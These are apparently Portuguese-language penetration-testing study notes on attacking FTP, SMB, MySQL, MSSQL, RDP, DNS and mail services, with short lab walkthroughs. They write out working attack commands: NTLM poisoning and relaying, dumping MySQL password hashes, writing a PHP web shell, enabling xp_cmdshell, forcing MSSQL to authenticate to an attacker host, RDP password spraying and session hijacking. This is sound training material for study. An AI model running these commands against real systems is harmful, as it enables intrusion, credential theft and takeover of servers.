# Attacking Common Services & Misconfigurations

Análise técnica e técnicas de exploração de vulnerabilidades e erros de configuração em serviços comuns de rede corporativa.

---

## Framework Geral de Análise de Ataques
Para cada serviço, analise:
1. **Source (Origem):** De onde vem o tráfego e qual nível de autenticação é exigido.
2. **Process (Processo):** Qual daemon/processo trata a requisição no sistema operacional.
3. **Privileges (Privilégios):** Sob qual conta o serviço executa (SYSTEM, root, service account).
4. **Destination (Destino):** Qual o objetivo final e impacto de um comprometimento.
*Exemplo histórico:* Vulnerabilidade Log4j (CVE-2021-44228) permitindo RCE em aplicações Java via cabeçalho HTTP JNDI.

---

## Ataques a Serviços de Compartilhamento

### 1. Attacking FTP (Portas 20 / 21)
- **Acesso Anônimo:**
```bash
ftp <TARGET_IP>
# Usuário: anonymous / Senha: [enter ou e-mail]
```
- **Ataque FTP Bounce:** Abuso da instrução `PORT` do FTP para realizar varreduras de portas internas através do servidor FTP.
- **CoreFTP CVE-2022-22836 (Path Traversal em PUT):** Envio de requisição HTTP `PUT` gravando arquivos arbitrários fora da raiz do servidor web.

### 2. Attacking SMB (Portas 139 / 445)
- **Null Sessions & Anonymous Enum:**
```bash
rpcclient -U "" -N <TARGET_IP>
enum4linux-ng -A <TARGET_IP>
```
- **Execução Remota de Comandos (com credenciais válidas):**
  - **PsExec:** Cria um serviço executável remoto no compartilhamento `ADMIN$`.
  - **SMBExec:** Executa comandos modificando chaves de registro do serviço sem gravar arquivo no disco.
  - **ATExec:** Utiliza o agendador de tarefas do Windows via RPC.
- **Envenenamento LLMNR/NBT-NS (Responder):**
Captura de solicitações de resolução de nomes na rede local e obtenção de hashes NetNTLMv2.
```bash
responder -I eth0 -dwv
```
- **NTLM Relaying:** Redirecionamento da autenticação capturada pelo Responder para sistemas que não exijam assinatura SMB (`SMB Signing: Disabled`).
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

---

## Ataques a Bancos de Dados SQL

### 1. MySQL (Porta 3306)
- **Comandos Úteis de Enumeração e Exploração:**
```sql
SELECT version(), user(), database();
SELECT host, user, password FROM mysql.user;
```
- **Leitura de Arquivos Locais (se `secure_file_priv` estiver vazio):**
```sql
SELECT load_file('/etc/passwd');
```
- **Gravação de Web Shell:**
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### 2. MSSQL - Microsoft SQL Server (Porta 1433)
- **Habilitar e Executar `xp_cmdshell` (RCE):**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
- **Automação OLE (sp_OACreate):** Método alternativo de execução de comandos se `xp_cmdshell` estiver bloqueado.
- **Captura de Hash NTLM via `xp_dirtree` / `xp_fileexist`:**
Força o servidor MSSQL a se autenticar no Responder do atacante:
```sql
EXEC master..xp_dirtree '\<ATTACKER_IP>share';
```
- **Abuso de Impersonate (EXECUTE AS):**
```sql
SELECT name, is_disabled FROM sys.server_principals WHERE can_login = 1;
EXECUTE AS LOGIN = 'sa';
```
- **Servidores Vinculados (Linked Servers):** Encadeamento de consultas entre múltiplos servidores SQL corporativos para elevar privilégios.

---

## Ataques a RDP (Porta 3389)
- **Password Spray & Brute Force:**
```bash
crowbar -b rdp -s <TARGET_IP>/32 -U users.txt -c 'Password123'
```
- **Hijacking de Sessão RDP sem Senha (tscon.exe):** Se um atacante obtiver acesso SYSTEM, pode conectar-se a sessões de outros usuários conectados via `tscon.exe`:
```cmd
query user
tscon 2 /dest:rdp-tcp#0
```
- **Ataque BlueKeep (CVE-2019-0708):** RCE pré-autenticação em versões antigas do Windows.

---

## Ataques a DNS (Porta 53)
- **Transferência de Zona (AXFR):**
```bash
dig axfr @<TARGET_IP> targetdomain.com
```
- **Subdomain Takeover:** Ocorre quando um registro DNS CNAME aponta para um serviço de nuvem abandonado (ex: GitHub Pages, S3 Bucket).
- **DNS Spoofing / Cache Poisoning:** Injeção de respostas falsas via Ettercap ou ARP spoofing.

---

## Ataques a Serviços de Email (SMTP / IMAP / POP3)
- **Enumeração de Usuários:** `VRFY`, `EXPN`, `RCPT TO` via Telnet ou `smtp-user-enum`.
- **Spray de Credenciais em Office 365 / Exchange:** Usando `o365spray`.
- **Open Relay:** Servidor SMTP que aceita entregar e-mails para qualquer domínio externo sem autenticação. Testar com a ferramenta `swaks`:
```bash
swaks --to victim@external.com --from test@targetdomain.com --server <TARGET_IP>
```

---

## Walkthroughs dos Labs de Serviços
- **Lab Fácil:** Abuso de upload vulnerável no CoreFTP para gravar uma web shell PHP e explorar banco MySQL com credenciais padrão.
- **Lab Médio:** Identificação de transferência de zona DNS exposta para listar subdomínios e extração de chaves de e-mail em POP3.
- **Lab Difícil:** Acesso a compartilhamentos SMB restritos, abuso do recurso `IMPERSONATE` e `Linked Servers` no MSSQL para obter controle total do controlador de domínio.

---
*Notas relacionadas:* [[Footprinting]], [[Password Attacks]], [[Active Directory]], [[Pivoting]]
